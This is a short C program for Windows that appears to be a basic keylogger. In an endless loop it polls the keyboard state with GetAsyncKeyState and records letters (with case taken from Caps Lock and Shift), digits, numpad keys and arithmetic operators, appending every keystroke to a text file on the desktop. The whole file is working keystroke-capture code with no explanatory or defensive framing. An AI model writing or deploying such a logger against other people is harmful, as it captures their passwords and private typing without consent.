# include <stdio.h>
# include <windows.h>

int main(){

 const char *route = ("C:\\Users\\USUARIO\\Desktop\\file.txt");
 FILE *f = fopen(route, "w");
 if(f == NULL){
  perror("Error creating file");
  return 1;
 }

 static SHORT prevState[256] = {0};

 char mayusArr[] = {
    'A','B','C','D','E','F','G','H','I','J','K','L','M',
    'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' 
 };

 char minusArr[] = {
    'a','b','c','d','e','f','g','h','i','j','k','l','m',
    'n','o','p','q','r','s','t','u','v','w','x','y','z'
 };

 char numsArr[] = {
  '0','1','2','3','4','5','6','7','8','9'
 };

 char operatorsArr[] = {'+', '-', '*', '/', '%', '='};

 while(1){

  int mayusArrLen = sizeof(mayusArr) / sizeof(mayusArr[0]);
  int minusArrLen = sizeof(minusArr) / sizeof(minusArr[0]);
  int numsArrLen = sizeof(numsArr) / sizeof(numsArr[0]);
  int operatorsArrLen = sizeof(operatorsArr) / sizeof(operatorsArr[0]);

  int BlocMayus = GetKeyState(VK_CAPITAL) & 0x0001;
  int shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? 1 : 0;

  for(int x = 0; x < mayusArrLen; x++){
    SHORT currentState = GetAsyncKeyState(mayusArr[x]);

    if ((currentState & 0x8000) &&
       !(prevState[mayusArr[x]] & 0x8000)) {

        if(BlocMayus ^ shiftPressed){
            fprintf(f, "%c", mayusArr[x]);
        } else {
            fprintf(f, "%c", minusArr[x]);
        }
        fflush(f);
    }

    prevState[mayusArr[x]] = currentState;
  }

  for(int z = 0; z < numsArrLen; z++){
    SHORT currentState = GetAsyncKeyState(VK_NUMPAD0 + z);

    if ((currentState & 0x8000) &&
       !(prevState[VK_NUMPAD0 + z] & 0x8000)) {

        fprintf(f,"%c", numsArr[z]);
        fflush(f);
    }

    prevState[VK_NUMPAD0 + z] = currentState;
  }

  for(int x = 0; x < numsArrLen; x++){
    SHORT currentState = GetAsyncKeyState(numsArr[x]);

    if ((currentState & 0x8000) &&
       !(prevState[numsArr[x]] & 0x8000)) {

        fprintf(f,"%c", numsArr[x]);
        fflush(f);
    }

    prevState[numsArr[x]] = currentState;
  }

  SHORT stateMul = GetAsyncKeyState(VK_MULTIPLY);
  if ((stateMul & 0x8000) && !(prevState[VK_MULTIPLY] & 0x8000)){
    fprintf(f, "*");
    fflush(f);
  }
  prevState[VK_MULTIPLY] = stateMul;

  SHORT stateAdd = GetAsyncKeyState(VK_ADD);
  if ((stateAdd & 0x8000) && !(prevState[VK_ADD] & 0x8000)){
    fprintf(f, "+");
    fflush(f);
  }
  prevState[VK_ADD] = stateAdd;

  SHORT stateSub = GetAsyncKeyState(VK_SUBTRACT);
  if ((stateSub & 0x8000) && !(prevState[VK_SUBTRACT] & 0x8000)){
    fprintf(f, "-");
    fflush(f);
  }
  prevState[VK_SUBTRACT] = stateSub;

  SHORT stateDec = GetAsyncKeyState(VK_DECIMAL);
  if ((stateDec & 0x8000) && !(prevState[VK_DECIMAL] & 0x8000)){
    fprintf(f, ".");
    fflush(f);
  }
  prevState[VK_DECIMAL] = stateDec;

  SHORT stateDiv = GetAsyncKeyState(VK_DIVIDE);
  if ((stateDiv & 0x8000) && !(prevState[VK_DIVIDE] & 0x8000)){
    fprintf(f, "/");
    fflush(f);
  }
  prevState[VK_DIVIDE] = stateDiv;

  Sleep(10);
 }

 return 0;
}
